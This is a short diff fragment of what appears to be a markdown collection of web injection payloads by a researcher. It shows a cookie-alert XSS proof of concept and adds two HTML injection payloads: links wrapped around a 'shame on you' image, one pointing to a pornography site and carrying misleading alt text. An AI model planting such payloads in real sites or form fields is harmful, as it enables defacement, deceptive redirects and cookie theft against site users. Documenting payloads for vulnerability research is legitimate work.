@@ -84,10 +84,15 @@ nu11secur1ty<script>alert(document.cookie)</script>
 ```
 
 ## Shame on you
+- 00
 ```
 <a href="https://pornhub.com/" target="_blank" rel="noopener nofollow ugc">
 <img src="https://media.tenor.com/-K9sHxXAb-cAAAAC/shame-on-you-patricia.gif??token=GHSAT0AAAAAABXWGSKOH7MBFLEKF4M6Y3YCYYKADTQ&rs=1" style="border:1px solid black;max-width:100%;" alt="Photo of Byron Bay, one of Australia's best beaches!">
 </a>
+```
+- 01
+```
+<a href="https://www.nu11secur1ty.com/"><img src=https://media.tenor.com/-K9sHxXAb-cAAAAC/shame-on-you-patricia.gif">
 ```
 
 ## without error report + link to malicious URL
